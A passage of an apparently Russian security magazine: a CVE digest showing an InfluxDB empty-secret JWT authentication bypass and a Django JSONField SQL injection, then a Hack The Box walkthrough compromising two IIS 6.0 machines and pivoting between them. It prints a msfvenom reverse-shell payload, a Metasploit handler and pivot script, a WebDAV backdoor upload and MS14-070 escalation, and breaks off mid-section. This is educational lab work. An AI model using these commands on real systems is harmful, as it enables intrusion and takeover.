1590:                   }
1591:                   return []byte(h.Config.SharedSecret), nil
1592:               }
1593:
1594:               // Parse and validate the token.
1595:               token, err := jwt.Parse(creds.Token, keyLookupFn)
1596:               if err != nil {
1597:                   h.httpError(w, err.Error(), http.Status
Unauthorized)
1598:                   return
1599:               } else if !token.Valid {
1600:                   h.httpError(w, "invalid token", http.Status
Unauthorized)
1601:                   return
1602:               }

Если внимательно посмотреть, то нет никакой проверки, что SharedSecret
не пуст. А это значит, что ата кующему для авто риза ции достаточно передать
строку нулевой длины в качестве секрета и валидное имя пользовате ля.
  Давай проверим это. Сгенерировать данные можно, например, на jwt.io.





            Генерируем данные для аутентификации в InﬂuxDB

Теперь просто отправляем полученную строку в хидере Authorization вмес‐
те с необходимым запросом. Я пробую выполнить SHOW users.


POST /query HTTP/1.1
Host: influx.fh:8086
Accept: */*
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2
VybmFtZSI6ImFkbWluIiwiZXhwIjoxNTc3MjM5MDIyfQ.x‐gfOaWUKs9GBqhF5
p3MPYvQ5WhqNzxTTlElYpM8n_E


db=sample&q=show+users





  Обход аутентификации в InﬂuxDB при помощи пустой переменной
  shared‐secret

Вуаля, сервер возвращает результаты запроса, а значит, авторизация была
успешно пройдена.
   Такого, разумеется, быть не должно, и разработчики уже выпустили патч,
который добав ляет необ ходимые проверки. Проб лему усу губляло еще и то,
что на момент публикации уязвимос ти в официаль ной документации Authenti‐
cation and authorization не было никакого упомина ния ни о shared‐secret,
ни о том, насколько опас но оставлять его пустым. Сейчас справочная стра‐
ница обновле на и такой раздел уже сущес твует, да и сама система теперь
автоматически отключает аутентифика цию этим способом, если указан пус‐
той shader‐secret.


SQL-ИНЪЕКЦИЯ В DJANGO
Автор: Сейдж Абдулла (Sage M. Abdullah)
Дата релиза: 8.9.2019
CVE: CVE‐2019‐14234
Уяз вимые  версии:  в  ветке  Django  1.11  все  версии  до  1.11.23,
в 2.1 до 2.1.11 и в 2.2 до 2.2.4
   Теперь переключимся на Python, а именно фреймворк Django, который
довольно редко мелькает в рассылках по информационной безопасности.
Сначала займемся тес товым окружением. Здесь за нас уже все сделали
ребята из vulhub. Кло нируй их репозиторий и отправляйся в папку CVE‐2019‐
14234. В ней ты найдешь все, что нужно. Запус тить готовый стенд можно
парой команд.


docker‐compose build
docker‐compose up ‐d





         Сборка и запуск стенда для теста уязвимости в Django

На борту последняя уязвимая версия Django из вет ки 2.2 — 2.2.3, а также
необходимые данные. После развертывания окружения веб‐сервер будет
доступен на 8000‐м порте.





          Работающий стенд для тестирования CVE‐2019‐14234

Первым делом идем в админку и авторизуемся как admin:a123123123. Здесь
есть несколько кол лекций. Поле detail является экземпляром класса JSON‐
Field.


vuln/migrations/0001_initial.py
04: from django.contrib.postgres.fields import JSONField
...
14:     operations = [
15:         migrations.CreateModel(
16:             name='Collection',
17:             fields=[
18:                 ('id', models.AutoField(auto_created=True, primar
y_key=True, serialize=False, verbose_name='ID')),
19:                 ('name', models.CharField(max_length=128)),
20:                 ('detail', JSONField()),
21:             ],
22:         ),
23:     ]


vuln/models.py
05: class Collection(models.Model):
06:     name = models.CharField(max_length=128)
07:     detail = JSONField()
08:
09:     def __str__(self):
10:         return self.name

Как видишь, в качестве базы данных используется Postgres. Данные в нее
были импортированы из файла collection.json.


docker-entrypoint.sh
6: wait‐for‐it.sh ‐t 0 db:5432 ‐‐ echo "postgres is up"
7:
8: python manage.py migrate
9: python manage.py loaddata collection.json


collection.json
01: [
02:     {
03:       "model": "vuln.Collection",
04:       "pk": 1,
05:       "fields": {
06:         "name": "Example 1",
07:         "detail": {
08:             "title": "title 1",
09:             "author": "vulhub",
10:             "tags": ["python", "django"],
...
16:       "model": "vuln.Collection",
17:       "pk": 2,
18:       "fields": {
19:         "name": "Example 2",
...
23:             "tags": ["python"],





              Импортированные данные в Django

Конструкция с двумя нижними подчеркиваниями (shallow key) говорит Django
о том, что нужно выполнить расширенную филь тра цию данных. Например,
требуется выбрать записи, которые содержат тег django. В этом поможет
конструкция вида detail__tags__contains.





         Фильтрация данных в Django при помощи shallow keys

Эта конструкция парсится и трансформиру ется в запрос к базе данных.
В  терминологии  Django __tags —  это  transform,  а __contains —
это lookup. Первое говорит, где нужно искать (в каком поле), а второе —
каким образом выполнять сравнение с переданными значениями.


/django-2.2.3/django/db/models/lookups.py
013: class Lookup:
...
129: class Transform(RegisterLookupMixin, Func):

Так как JSONField — это специальный тип данных в Postgres, то для коррек‐
тной работы с ним нужно было изменить логику обычных transform и lookup.
И если lookup практичес ки не изменил ся, то transform — кардинально. Пос‐
мотрим на импле мен тацию метода get_transform.


/django-2.2.3/django/contrib/postgres/fields/jsonb.py
07: from django.db.models import (
08:     Field, TextField, Transform, lookups as builtin_lookups,
09: )
...
14: __all__ = ['JSONField']
15:
16:
17: class JsonAdapter(Json):
...
30: class JSONField(CheckFieldDefaultMixin, Field):
...
53:     def get_transform(self, name):
54:         transform = super().get_transform(name)
55:         if transform:
56:             return transform
57:         return KeyTransformFactory(name)

В конечном счете модель должна сгенерировать SQL‐запрос. За это отве‐
чает метод as_sql.


/django-2.2.3/django/contrib/postgres/fields/jsonb.py
094: class KeyTransform(Transform):
095:     operator = '‐>'
096:     nested_operator = '#>'
...
098:     def __init__(self, key_name, *args, **kwargs):
099:         super().__init__(*args, **kwargs)
100:         self.key_name = key_name
...
102:     def as_sql(self, compiler, connection):
103:         key_transforms = [self.key_name]
104:         previous = self.lhs
105:         while isinstance(previous, KeyTransform):
106:             key_transforms.insert(0, previous.key_name)
107:             previous = previous.lhs
108:         lhs, params = compiler.compile(previous)
109:         if len(key_transforms) > 1:
110:             return "(%s %s %%s)" % (lhs, self.nested_operator),
[key_transforms] + params
111:         try:
112:             int(self.key_name)
113:         except ValueError:
114:             lookup = "'%s'" % self.key_name

Как видно из кода, если я передам одинарную кавычку в наз вании ключа,
который нужно искать в объекте JSON, то разорву конкатенацию строки
и нарушу логику запроса.





                    SQL‐инъекция в Django 2.2.3


SELECT COUNT(*) AS "__count" FROM "vuln_collection" WHERE ("vuln_c
ollection"."detail" ‐> 'ta'gs') @> %s')

Здесь уже можно применять обычные техники экс плуатации SQL‐инъ екций,
а так как это Postgres, то существу ет возможность рас крутить ее до вы пол‐
нения произвольного кода.
   Аналогичную проб лему можно наб людать в реализации HStoreField.


/django-2.2.3/django/contrib/postgres/fields/hstore.py
14: class HStoreField(CheckFieldDefaultMixin, Field):
...
25:     def get_transform(self, name):
26:         transform = super().get_transform(name)
27:         if transform:
28:             return transform
29:         return KeyTransformFactory(name)
...
80: class KeyTransform(Transform):
81:     output_field = TextField()
...
87:     def as_sql(self, compiler, connection):
88:         lhs, params = compiler.compile(self.lhs)
89:         return "(%s ‐> '%s')" % (lhs, self.key_name), params

На этом мы и закончим. Впереди новый год и, можно не сомневаться, новые
баги!
ВЗЛОМ

 БОЛЬШОЙ
 ПРОБРОС





    ОТТАЧИВАЕМ ИСКУССТВО PIVOT‐
           ING НА ВИРТУАЛКАХ
          С HACK THE BOX





Умение пользовать ся техникой pivoting —
проброса трафика к жертве (и обратно)
через промежуточные хосты — жизненно
важный скилл для этичного хакера, он при‐                                                                                       snovvcrash
годится  при  тестирова нии  на  про ник‐        Безопасник,питонщик, временамиместами
новение  любой  корпоратив ной  сетки.       необходимостикриптоана(рхист)литик,системныйпо
В этой статье мы превратим про хождение        snovvcrash@protonmail.chадминистратор
двух несложных виртуалок с Hack The Box
в полезную шпаргалку по проксирова нию
соединений во время пентеста.


На заре станов ления Hack The Box как онлайн‐площадки для тренировки вай‐
тхетов в списке машин значились две вир туалки: Grandpa (IP: 10.10.10.14)
и Granny (IP: 10.10.10.15). Обе эти машины нацелены на эксплуатацию уяз‐
вимостей WebDAV (набора дополнений для HTTP), и стратегии захвата их
root‐флагов практически не отличаются друг от друга.
  Поэтому, чтобы разнооб разить прохождения, мы сначала быс тро рассмот‐
рим, как можно взло мать каждый из хос тов по отдельности, а после этого
превратим один из них в шлюз, через который ата куем второй хост.


GRANNY
Первой мы будем проходить виртуалку Granny. Эта машина достаточно прос‐
та (рейтинг сложности — 3,4 балла из 10), однако, как по мне, она мак‐
симально приближена к случаям из реальной жиз ни (по крайней мере там,
где не следят за обновлениями ПО). Недаром именно такие тачки час то
попадаются на сертификации OSCP в лайтовой ценовой категории.





                       Hack The Box — Granny


Раз ведка
Для начала сканируем порты и исследуем найденные сервисы.


Nmap
Сканирование Nmap я провожу в два этапа: поверхностное (только SYN‐
пакеты, без скриптов) и точечное по найденным портам (с задей ствовани ем
скриптового движка NSE и определением версий сервисов).



  root@kali:~# nmap ‐n ‐Pn ‐oA nmap/granny‐initial 10.10.10.15
  root@kali:~# cat nmap/granny‐initial.nmap
  ...
  Host is up (0.065s latency).
  Not shown: 999 filtered ports
  PORT   STATE SERVICE
  80/tcp open  http
  ...


Видим только один открытый порт — 80‐й, веб. Узна ем, кто там живет.



  root@kali:~# nmap ‐n ‐Pn ‐sV ‐sC ‐oA nmap/granny‐version 10.10.10.15 ‐
  p80
  root@kali:~# cat nmap/granny‐version.nmap
  ...
  PORT   STATE SERVICE VERSION
  80/tcp open  http    Microsoft IIS httpd 6.0
  | http‐methods:
  |_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH
  SEARCH MKCOL LOCK UNLOCK PUT
  |_http‐server‐header: Microsoft‐IIS/6.0
  |_http‐title: Under Construction
  | http‐webdav‐scan:
  |   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY,
  MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
  |   WebDAV type: Unknown
  |   Server Date: Sat, 21 Dec 2019 18:04:11 GMT
  |   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE,
  PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
  |_  Server Type: Microsoft‐IIS/6.0
  Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
  ...


Итак, что у нас есть? Веб‐сервер Microsoft IIS, версия 6.0. Если спросить
Google, что он знает об этой ревизии IIS, то он сдаст «мелкомягких» с пот‐
рохами: Windows Server 2003.





            Узнаем версию Windows по версии веб‐сервера IIS

Информации об архитектуре Windows у нас нет, поэтому пока будем счи тать,
что это x86, ибо они были более распростра нены в свое время. Также скрипт
http‐webdav‐scan.nse оповес тил нас об уста новленном наборе HTTP‐рас‐
ширений WebDAV. В общем, все намекает на то, что нам суждено отправиться
на исследование веба.


        WWW

                      Если парамет ры, передаваемые сканеру, кажутся
                       неочевидными, рекомендую обратиться к про‐
                      хождению машины CTF — там они описаны более
                      подробно.



Веб
Изучим 80‐й порт с разных углов: от простого браузера до спе циальных ути‐
лит для работы с WebDAV.


Об щие све дения
На главной странице веб‐сервера (http://10.10.10.15/) — заглушка.





                              http://10.10.10.15:80/

Браузер оказался немногословен, поэтому пос тараемся расширить список
наших знаний о системе заголовками HTTP‐хедеров.



  root@kali:~# curl ‐I 10.10.10.15
  HTTP/1.1 200 OK
  Content‐Length: 1433
  Content‐Type: text/html
  Content‐Location: http://10.10.10.15/iisstart.htm
  Last‐Modified: Fri, 21 Feb 2003 15:48:30 GMT
  Accept‐Ranges: bytes
  ETag: "05b3daec0d9c21:348"
  Server: Microsoft‐IIS/6.0
  MicrosoftOfficeWebServer: 5.0_Pub
  X‐Powered‐By: ASP.NET
  Date: Sat, 21 Dec 2019 21:51:01 GMT


В заголовках ожидаемо присутс тву ет информа ция о том, что используется
ASP.NET. Держи в голове две базовые схемы, когда речь заходит о сте ке тех‐
нологий веб‐разработки:
 • LAMP = Linux + Apache + MySQL + PHP
 • WISA = Windows + IIS + SQL Server + ASP.NET

В нашем случае, так как речь идет о Windows, платформа ASP.NET выс тупает
в роли альтернативы PHP. А это зна чит, что именно этот компонент сте ка
будет средой для создания полезной нагрузки бэкдора, и было бы неплохо
найти способ доставки на сервер файлов с расширением asp/aspx.


WebDAV
Надстройки WebDAV привносят дополнительные методы в дефол тный набор
HTTP‐запросов. Один из них — метод MOVE, который позволяет переме щать
(грубо говоря, переименовывать) файлы на сервере. Идея нашего злодеяния
довольно проста: загрузить на веб‐сервер легитимный файл и переиме‐
новать его в исполняемый, изменив расширение на asp или aspx. Таким
образом мы обойдем черный список из типов файлов, которые нельзя было
загрузить изначально. Эта уловка ста ра как мир, а в основе ее лежит небезо‐
пасная настройка веб‐сервера (OSVDB‐397), доверяющая метод PUT кому
угодно.


             INFO

                     Для классификации угрозы безопасности я вос‐
                       пользовался  нотацией OSVDB. OSVDB  (Open
                       Sourced  Vulnerability Database) — опенсорсная
                       база  данных  уязвимостей,  которая  в  апре‐
                       ле 2016 года прек ратила свое существо вание.
                     Однако здесь нам на помощь пришел агрегатор
                      ИБ‐кон тента  Vulners, который впитал  в  себя,
                        в  частности, и  эту  базу  дан ных. Подробнее
                        почитать о нем можно в статье «Vulners — Гугл
                       для  хакера.  Как  устро ен  лучший  поисковик
                      по уязвимостям и как им пользоваться».


Для взаимодействия с WebDAV есть несколько удоб ных инструментов коман‐
дной строки, которыми мы и вос пользуемся.
  Сначала  иссле дуем  сос тояние  безопасности  с помощью  davtest.
К сожалению, эта утилита не позволяет указать прокси‐сервер, чтобы пос‐
мотреть, какие именно запросы были отправлены, поэтому мы поступим хит‐
ро: запустим Burp Suite, перейдем на вкладку Proxy → Options и добавим
еще один листенер 10.10.10.15:80 на интерфейс loopback.





          Настрой ка допол нительного лис тенера в Burp Suite

Теперь  я могу  натравить davtest на  localhost  точно  так  же,  как на
10.10.10.15, и все запросы полетят через проксю Burp.



  root@kali:~# davtest ‐rand evilhacker ‐url localhost
  ********************************************************
  Testing DAV connection
  OPEN            SUCCEED:                localhost
  ********************************************************
  NOTE    Random string for this session: evilhacker
  ********************************************************
  Creating directory
  MKCOL           FAIL
  ********************************************************
  Sending test files
  PUT     aspx    FAIL
  PUT     php     FAIL
  PUT     cgi     FAIL
  PUT     jhtml   FAIL
  PUT     html    FAIL
  PUT     asp     FAIL
  PUT     txt     FAIL
  PUT     cfm     FAIL
  PUT     pl      FAIL
  PUT     shtml   FAIL
  PUT     jsp     FAIL


  ********************************************************


Несмотря на то что, по мнению davtest, все попытки загрузить какой‐либо
файл на сервер провалились, мы можем открыть исто рию Burp и пос мотреть,
что же на самом деле произошло.





                История HTTP‐запросов Burp Suite

Как видно из скриншота, раз ные запросы PUT получили разные ответы
веб‐сервера:
 • при попытке загрузить файл с расширением aspx — категорический зап‐
   рет (403);
 • для файлов .asp, .cgi, .shtml — неопределен ное поведение (404, не уве‐
   рен, почему IIS выбрал именно эту ошиб ку);
 • для всего остального — конфликт загрузки (409).

Последняя ошибка привлекла мое внимание, потому что встречается она
не так часто и связана в основном с конфликтами версий загружаемого
и существующего на сервере файлов.
   «Этой ошибке здесь не мес то», — подумал я и посмотрел внимательнее
на тело запроса загрузки прос того текстового файла.


PUT /localhost/davtest_evilhacker.txt HTTP/1.1
TE: deflate,gzip;q=0.3
Connection: close
Host: localhost:80
User‐Agent: DAV.pm/v0.49
Content‐Length: 19


TXT put via davtest

Вся проблема в том, что davtest попытал ся загрузить эти файлы в несущес‐
твующий каталог /localhost. Еще раз открыв историю HTTP, я уви дел запрос
MKCOL на создание директории, который также провалился с ошибкой 409.
Выглядел он так.


MKCOL /localhost/DavTestDir_evilhacker/ HTTP/1.1
TE: deflate,gzip;q=0.3
Connection: close
Host: localhost:80
User‐Agent: DAV.pm/v0.49
Content‐Length: 0

Как нетрудно догадаться, проблема заключа ется в попытке создать вложен‐
ный каталог /DavTestDir_evilhacker внут ри несуществующего родителя
/localhost. Не знаю, умеет ли так делать WebDAV в принципе (смотреть спе‐
цификацию было лень; может, в ком мента риях подскажут), но, если поп‐
робовать создать одно уровневую директорию /localhost, она успешно
появится, и все встанет на свои мес та.





              Создание катало га /localhost в Burp Suite





        Загрузка текстового файла в каталог /localhost в Burp Suite

После этого текстовый файл успешно загрузился, а это означает, что наш
план в силе и можно приступать к генерации полезной нагрузки.


Шелл от име ни NT AUTHORITY\NETWORK SERVICE
Теперь у тебя есть несколько вариантов выбора полез ной нагрузки, и все
зависит только от конечной цели твоего проникновения в систему.
 • Например, если ты точно знаешь, где лежит то, что тебе нужно, и для дос‐
   тупа хватит базовых привилегий в системе, то можно ограничиться прос‐
  тым веб‐шеллом, взаимо действо вать с которым можно прямо из браузе‐
   ра.
 • Если же тебе нужно внимательнее осмотреться на хосте, тогда твоим
  выбором может стать тот же самый веб‐шелл в связ ке с пейлоадом
   на PowerShell, что в ито ге дару ет тебе реверс‐шелл.
 • Ну а если твоя цель — полный захват контроля над тачкой с эскалацией
   привилегий до админа, тог да Meterpreter — твой путь.

Конечно, мы выберем последний вариант.


Ге нерация пейлоада
С помощью msfvenom создадим бэкдор с полезной нагрузкой Meterpreter
для 32‐битной версии Windows в формате aspx.



  root@kali:~# msfvenom ‐p windows/meterpreter/reverse_tcp ‐a x86 ‐‐plat‐
  form win LHOST=10.10.14.10 LPORT=31337 ‐f aspx > meterpreter/m.aspx


Далее я создам скрипт автозапус ка слушателя Metasploit, чтобы не вводить
команды каждый раз вручную в консоли MSF.


# meterpreter/l.rc
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 31337
set ExitOnSession false
exploit ‐j ‐z


cadaver
В Kali есть инструмент с жут коватым наз ванием cadaver (то есть «труп») —
это консольный WebDAV‐клиент, который облегча ет взаимодействие с Web‐
DAV из командной строки.
  Я скопирую сгенерированный в msfvenom бэкдор в текстовый файл m.txt,
загружу его на сер вер и переименую в m.aspx в интерактивной сессии ca‐
daver.



  root@kali:~# cp meterpreter/m.aspx m.txt
  root@kali:~# cadaver  http://10.10.10.15
  dav:/> put m.txt
  dav:/> move m.txt m.aspx





          Загрузка и перемещение бэкдора с помощью cadaver

Теперь можно поднимать слушателя Metasploit и запус кать сам файл m.aspx
на сервере (просто обра титься к нему из браузера).



  root@kali:~# msfconsole ‐qr meterpreter/l.rc





       Запуск листенера Metasploit и получение сессии Meterpreter

И вот у нас уже есть сессия Meterpreter от имени NT AUTHORITY\NETWORK
SERVICE.


             INFO

                     К слову, все это можно было проделать одним
                        кликом —  модуль  exploit/windows/iis/
                   iis_webdav_upload_asp для Metasploit авто‐
                      матизирует весь про цесс.





                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
  БОЛЬШОЙ ПРОБРОС
                 ОТТАЧИВАЕМ ИСКУССТВО PIVOTING
                   НА ВИРТУАЛКАХ С HACK THE BOX





Шелл от име ни NT AUTHORITY\SYSTEM
Далее  дело  техники:  запус тим  советчик  по  локальным  уязвимостям
и выберем наугад первый попавшийся эксплоит — благо тачка старая
и выбор велик.





         Поиск доступных локальных экс плоитов (ВМ Granny)

После минутного ожидания 29 уяз вимостей были провере ны, и семь из них
подошли с высокой веро ятностью.





       Повышение привилегий с помощью MS14‐070 (ВМ Granny)

Я выбрал MS14‐070 — уязвимость виндового стека TCP/IP. Повыше ние при‐
вилегий с помощью Metasploit заняло считаные секунды, и я получил привиле‐
гированный шелл.


             INFO

                  Магия Metasploit — это, конечно, круто, однако
                        за  кажущейся  простотой  часто  скрываются
                       довольно нетривиальные пассы с WinAPI. Нап‐
                       ример, на форуме Hack The Box люди часто прак‐
                         тикуются с повышением привилегий без помощи
                           Meterpreter.


Если заспавнить шелл и спросить whoami, сервер ответит, что ты все
еще обладаешь правами не выше NETWORK SERVICE. Происходит это из‐за
того, что пейлоад Meterpreter все еще инжекти рован в первый процесс,
который мы заарканили до повышения привилегий. Для того чтобы получить
права SYSTEM из оболочки cmd, достаточно мигрировать вредоносный про‐
цесс в процесс с соот ветс тву ющими привилегиями.





                        Who am I?

Я выбрал cidaemon.exe с PID 3964 в качес тве носителя и подселился к нему.





              Миграция в про цесс cidaemon.exe (3964)

Теперь права отоб ражаются корректно.





                  Я спро шу снова: Who am I?

Дело за малым: найти и вытащить хеши (флаги) юзера и администратора.
Сделаю  я  это с помощью  Meterpreter — а именно модулей search
и download.





                 Получение флагов (ВМ Granny)

Напоследок посмотрим на разрядность ОС.



  meterpreter > sysinfo
  Computer        : GRANNY
  OS              : Windows .NET Server (5.2 Build 3790, Service Pack 2).
  Architecture    : x86
  System Language : en_US
  Domain          : HTB
  Logged On Users : 1
  Meterpreter     : x86/windows


Судя по све дениям sysinfo, наше предположение о 32‐битной природе Win‐
dows подтвердилось.
  На этом виртуалку Granny считаю пройденной.





                             Трофей

Переходим к Grandpa.


GRANDPA
Эту тачку (рейтинг сложности — 4,5 балла из 10) я пробегу быс трее и не буду
так подробно останавливать ся на каждом пункте.





                      Hack The Box — Grandpa


Раз ведка
Nmap
Так же в два этапа просканиру ем Nmap.



  root@kali:~# nmap ‐n ‐Pn ‐oA nmap/grandpa‐initial 10.10.10.14
  root@kali:~# cat nmap/grandpa‐initial.nmap
  ...
  Host is up (0.064s latency).
  Not shown: 999 filtered ports
  PORT   STATE SERVICE
  80/tcp open  http
  ...


Результаты пов торяются точь‐в‐точь.



  root@kali:~# nmap ‐n ‐Pn ‐sV ‐sC ‐oA nmap/grandpa‐version 10.10.10.14 ‐
  p80
  root@kali:~# cat nmap/grandpa‐version.nmap
  ...
  PORT   STATE SERVICE VERSION
  80/tcp open  http    Microsoft IIS httpd 6.0
  | http‐methods:
  |_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK
  DELETE PUT MOVE MKCOL PROPPATCH
  |_http‐server‐header: Microsoft‐IIS/6.0
  |_http‐title: Under Construction
  | http‐webdav‐scan:
  |   Server Type: Microsoft‐IIS/6.0
  |   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY,
  MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
  |   WebDAV type: Unknown
  |   Server Date: Sat, 21 Dec 2019 16:49:20 GMT
  |_  Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH,
  LOCK, UNLOCK
  Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
  ...



Веб
На главной странице веб‐сайта висит такая же заглушка.





                              http://10.10.10.14:80/


WebDAV
Единственное существенное различие между дву мя тачками, пожалуй, в типах
брешей WebDAV. На этой машине доступ к загрузке файлов на сервер
с помощью PUT запрещен для любых типов файлов. Однако, помня о номере
версии IIS, я восполь зовался на шумевшим в свое время эксплоитом для CVE‐
2017‐7269. Основыва ется он на ошиб ке функции ScStoragePathFromUrl,
которая содержит  уяз вимость переполнения буфера  в  строке одного
из хедеров запроса PROPFIND (из арсенала WebDAV).
  Оригинальный PoC дос тупен на GitHub, однако я пользовался встроенным
модулем Metasploit — iis_webdav_scstoragepathfromurl.





  Эксплуатация переполнения в ScStoragePathFromUrl с помощью
  Metasploit

После получения сессии Meterpreter ты можешь столкнуться с ошибкой прав
доступа. Причины возникновения этого бага схожи с теми, что мы наблюдали
в аналогичной ситуации при прохож дении Granny: пейлоаду тес но в процес‐
се, в котором он сидит.
   Чтобы выйти из этого положения, я сно ва вызову Process List и мигрирую
в тот процесс, который обла дает нужными мне полномочиями.





                Миграция в про цесс w3wp.exe (2408)

Кстати, чтобы узнать, в какой процесс был проведен первичный инжект, мож‐
но воспользоваться командой netstat до миграции и посмотреть список
активных сетевых соединений.



  C:\windows\system32\inetsrv>netstat ‐vb





           Определение текущего процесса Meterpreter


Эскалация привиле гий
Здесь все идентично предыдущей тачке: для повышения привилегий я буду
использовать тот же спло ит.





         Поиск доступных локальных экс плоитов (ВМ Grandpa)

Для порядка я запустил поиск локальных уяз вимос тей, и список оказал ся точ‐
но таким же, как и у виртуалки Granny.





      Повышение привилегий с помощью MS14‐070 (ВМ Grandpa)

Выбрали ms14_070_tcpip_ioctl, повысили привилегии и получили свою
сессию.





                 Получение флагов (ВМ Grandpa)

Забираем награду, и Grandpa пройден!





                             Трофей


PIVOTING
Ну а теперь, собственно, то, ради чего мы сегодня собрались! Я продемонс‐
трирую некоторые базовые принципы проб роса соединений с помощью
Metasploit.
  Обозначим условия задачи. Дано:
 1. Локальная ВМ атакующего с Kali Linux (IP: 10.10.14.30 ), которая имеет
   прямой доступ к ВМ Granny (IP: 10.10.10.15 ).
 2. ВМ   Granny,   которая  имеет   прямой  дос туп   к  ВМ  Grandpa
    (IP: 10.10.10.14 ).
 3. У ВМ атакующего нет прямого дос тупа к ВМ Grandpa — входящие и исхо‐
  дящие соединения блокиру ются с помощью iptables.

Требуется:
 1. Установить соединение между ВМ ата кующего и ВМ Grandpa для сторон‐
   них утилит (вне кон тек ста сес сии Metasploit).
 2. Установить соединение между ВМ ата кующего и ВМ Grandpa в кон тек-
  сте сессии Metasploit и получить максимальные права на хосте Grandpa.

Решение...


Под готовка
Я буду использовать стандартный файрвол для Linux iptables, чтобы исклю‐
чить прямое взаимодей ствие сво его хос та и хос та Grandpa. Так я буду уве‐
рен, что правила игры и правда выполняются.



  root@kali:~# iptables ‐A OUTPUT ‐d 10.10.10.14 ‐j DROP
  root@kali:~# iptables ‐A INPUT ‐s 10.10.10.14 ‐j DROP





          Блокирование исходящих соеди нений до ВМ Grandpa

Упрощенно схему подклю чения к скрытому за VPN сегменту (виртуальной)
сети лаборатории Hack The Box можно изоб разить так.





       Логическая схема подключения к лаборатории Hack The Box

Однако в рамках нашей задачи лучше абстрагиро ваться и представить схему
взаимодействия «Атакующий — Pivot — Grandpa» в следующем виде.





        Взаимодействие субъектов при реализации схемы Pivoting

Слева — атакующий (ВМ Kali), посередине — ВМ Granny, справа — жертва
(ВМ Grandpa). «Общение» напрямую между ата кующим и жертвой исключено.
Единственный способ вза имодействия — через про межуточный хост.


Точ ка опо ры
Хост посередине — а именно Granny — будем называть точкой опоры
или опорным пунктом (англ. foothold). Через него будет передаваться трафик
до Grandpa и обратно. Первым делом получим доступ к точке опоры, как мы
это делали ранее.
  Я написал скрипт автозапус ка для Metasploit, чтобы в слу чае, если что‐то
пойдет не так и нужно будет переза пус кать всю эту конс трукцию, мне
не пришлось заново вручную вводить команды.


# pivot.rc


use auxiliary/server/socks4a
set SRVPORT 9050
run ‐j


use exploit/windows/iis/iis_webdav_upload_asp
set LHOST tun0
set RHOST 10.10.10.15
set InitialAutoRunScript migrate ‐f
exploit ‐j


back

В первом блоке я поднимаю прокси‐сервер на локальном порте 9050, а во
втором — использую модуль iis_webdav_upload_asp для получе ния низ‐
копривилегированной сессии Meterpreter и сра зу же мигрирую в другой про‐
цесс, чтобы не словить ошибку нехватки токенов (прав доступа).



  root@kali:~# msfconsole ‐qr pivot.rc





     Получение сессии Meterpreter на точке опоры (взлом ВМ Granny)

После этого с помощью команды route add я добавляю правило маршру‐
тизации для открытой сес сии Meterpreter (сес сия 1).



  msf5 > route add 10.10.10.14/32 1
  [*] Route added


Здесь через слеш я указываю мас ку подсети 255.255.255.255 (в нотации
бесклассовой адресации — CIDR), что бы ассоциировать с этим правилом
только один хост — Grandpa (10.10.10.14).
  Предварительные  настройки  завершены,  в  чем  можно  убедиться
с помощью команд jobs и route.



  msf5 > jobs
  msf5 > route





    Запущенные фоновые процессы и активные правила маршрутизации

Первая команда покажет все про цес сы, которые запущены на фоне Metasploit
(видим наш SOCKS‐сервер), а вто рая выведет список активных правил мар‐
шрутизации.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
  БОЛЬШОЙ ПРОБРОС
                 ОТТАЧИВАЕМ ИСКУССТВО PIVOTING
                   НА ВИРТУАЛКАХ С HACK THE BOX





SOCKS-сервер с помощью Metasploit
Несмотря на то что сканиро вать порты можно средствами Metasploit (с нас‐
троенной там маршрутиза цией), во многих случаях необходимо пользоваться
сторонними инструментами для ана лиза целевой машины. В этом нам
и подыграет настроенный в предыду щем раз деле сервер SOCKS, через
который с помощью proxychains можно расшаривать трафик для внешних
утилит.

Зом би‑прок си
Недавно в Metasploit добавилась поддержка пятой версии протокола SOCKS,
однако, как бывает со всеми новыми фичами, в ней еще пол но багов. Но это
не повод расстраиваться, ведь версия 4a умеет практически все то же самое
(за исклю чением разве что поддержки аутентификации), в том числе и резол‐
вить DNS‐имена в IP. В сочетании с модулем route это дает прекрасную воз‐
можность использовать скомпрометированный хост в качестве обычного
прокси для браузера и таким образом открывать сайты от имени жертвы.


Я установлю proxychains‐ng (чет вертая версия), так как она всегда казалась
мне более стабильной, и запущу ска нирование Nmap через SOCKS‐прокси.



  root@kali:~# apt install proxychains4
  root@kali:~# proxychains4 nmap ‐n ‐v ‐Pn ‐sT 10.10.10.14 ‐p80





            Сканирование ВМ Grandpa через SOCKS‐прокси

Можно убедиться, что 80‐й порт на хосте Grandpa открыт.
  К сожалению, возможнос ти Nmap весь ма огра ниченны в случае исполь‐
зования сквозь proxychains (нет поддержки тихого SYN‐сканирования,
потому что proxychains не понима ет крафтовые пакеты, нет опре деления
версий сервисов, да и скорость оставляет желать лучшего), однако это всего
лишь пример, и точно так же можно использовать большинство других ути лит.
  Настройки proxychains‐ng находят ся в файле /etc/proxychains4.conf.
Там можно изменить номер порта, где расположилась прокся (мы исполь‐
зовали дефолтный 9050).
  На этом этапе нашу вообража емую схему можно допол нить пометками
об использовании SOCKS‐сервера и маршрутов Metasploit.





  Появление SOCKS‐сервера и маршру тов Metasploit в схеме взаимодей‐
  ствия


Ре версивный SSH-тун нель
Чтобы иметь возможность «общаться» с Grandpa в рамках сессии Metasploit,
мы дол жны настроить маршру тизацию через foothold обратно на наш хост.
   Из‐за того что я искусственно дро паю трафик между собой и Grandpa,
последний не может до меня дос тучать ся (равно как и я ответить ему), и нам
необходимо проложить эту часть мос та коммуникаций вручную. Сделать
